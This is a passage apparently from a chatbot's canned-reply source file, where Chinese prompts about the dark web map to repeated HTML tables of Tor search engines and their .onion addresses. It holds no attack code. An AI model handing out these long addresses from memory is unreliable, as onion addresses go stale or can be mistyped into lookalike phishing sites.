href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`,
            `<p>明白了，暗网中的搜索引擎 如下:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`,
            `<p>OK，以下是暗网中的搜索引擎:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion" rel="nofollow">http://freshonifyfe4rmuh6qwpsexfhdrww7wnt5qmkoertwxmcuvm4woo4ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Gdarks</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion" rel="nofollow">http://zb2jtkhnbvhkya3d46twv3g7lkobi4s62tjffqmafjibixk6pmq75did.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">The Deep Searches</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion" rel="nofollow">http://searchgf7gdtauh7bhnbyed4ivxqmuoat3nm6zfrg3ymkq6mtnpye3ad.onion</a></td>     </tr>   </tbody> </table>`
          ],
        },


        "暗网,网址": {
          reply: [
            `<p>以下是暗网中的搜索引擎:</p>  <table style="border-collapse: collapse; width: 100%; border: 1px solid #e1e1e1e2;">   <thead>     <tr>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">Search Engine</th>       <th style="border: 1px solid #e1e1e1e2; padding: 8px; text-align: left;">URL</th>     </tr>   </thead>   <tbody>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">FindTor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion" rel="nofollow">findtorroveq5wdnipkaojfpqulxnkhblymc7aramjzajcvpptd4rjqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Darkweblink.com</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion" rel="nofollow">dwltorbltw3tdjskxn23j2mwz2f4q25j4ninl5bdvttiy4xb6cqzikid.onion/</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Torch</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion" rel="nofollow">torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorDex</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion" rel="nofollow">tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Ahmia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion" rel="nofollow">juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Amnesia</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion" rel="nofollow">amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Demon</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion" rel="nofollow">srcdemonm74icqjvejew6fprssuolyoc2usjdwflevbdpqoetw4x3ead.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Sentor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion" rel="nofollow">e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Kraken</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion" rel="nofollow">krakenai2gmgwwqyo7bcklv2lzcvhe7cxzzva2xpygyax5f33oqnxpad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Haystak</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion" rel="nofollow">haystak5njsmn2hqkewecpaxetahtwhsbsa64jom2k22z5afxhnpxfid.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Bobby</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion" rel="nofollow">bobby64o755x3gsuznts6hf6agxqjcz5bop6hs7ejorekbm7omes34ad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Submarine</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion" rel="nofollow">no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">DuckDuckGo</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion" rel="nofollow">duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Excavator</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion" rel="nofollow">2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorBot</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion" rel="nofollow">torbotzotnpygayi724oewxnynjp4pwumgmpiy3hljwuou3enxiyq3qd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fenix</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion" rel="nofollow">fenixnjoy6gcmcihl5fnhjqw6k7j6ujvggk4467cgl5lfsoingndoeyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">TorLanD</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion" rel="nofollow">torlgu6zhhtwe73fdu76uiswgnkfvukqfujofxjfo7vzoht2rndyhxyd.onion</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Dark Tor</td>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;"><a href="http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html" rel="nofollow">http://darktorhvabc652txfc575oendhykqcllb7bh7jhhsjduocdlyzdbmqd.onion/hidden.html</a></td>     </tr>     <tr>       <td style="border: 1px solid #e1e1e1e2; padding: 8px;">Fresh onions</td>       <td style="border: 1px 